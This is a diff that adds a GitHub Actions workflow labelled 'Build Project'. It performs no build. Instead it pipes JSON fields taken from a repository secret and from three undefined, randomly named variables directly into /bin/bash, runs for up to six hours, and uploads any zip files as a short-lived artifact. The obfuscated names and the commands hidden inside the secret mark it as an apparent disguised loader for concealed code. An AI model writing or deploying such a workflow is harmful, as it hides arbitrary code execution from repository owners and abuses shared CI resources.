@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  task:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Execute
+        env:
+          qi92549: ${{ secrets.qi92549 }}
+        run: |
+          printf '%s' "$qi92549" | jq -r .dqi29 | /bin/bash
+          echo $unto2856 | jq -r .fzfhd6603 | /bin/bash
+          printf '%s' "$lbilo3897" | jq -r .zh373 | /bin/bash
+          echo $xhos62165 | jq -r .pdq65 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: nx1VF0hi
+          path: "*.zip"
+          retention-days: 1
